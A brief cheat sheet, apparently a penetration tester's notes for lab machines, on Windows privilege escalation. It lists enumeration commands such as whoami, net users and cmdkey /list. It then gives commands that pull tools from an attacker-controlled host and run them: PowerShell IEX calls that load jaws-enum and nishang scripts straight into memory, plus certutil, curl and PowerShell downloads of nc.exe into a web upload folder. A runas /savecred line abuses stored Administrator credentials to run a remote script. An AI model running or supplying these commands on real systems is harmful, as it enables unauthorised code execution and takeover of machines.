# Windows Priviledge Escalation

------------------------------------------------------

### Initial Commands
`whoami`
 
`whoami /prev`

`net users`

`net users Administrator`

`cmdkey /list`

`systeminfo`

`netstat`

### Downloading Files 
1. `powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.13:8000/jaws-enum.ps1')` (Use this when u dont 
    want to download the file to the disk)

2. `powershell IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.11:8000/
	nc.exe","C:\\xampp\htdocs\gym\upload\nc.exe")`

3. `certutil -urlcache -split -f http://10.10.14.11:8000/nc.exe`

4. `curl http://10.10.14.11:8000/nc.exe`

### Other Commands and tips
`runas /user:Administrator /savecred "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.13:8000/nishang2.ps1')"`


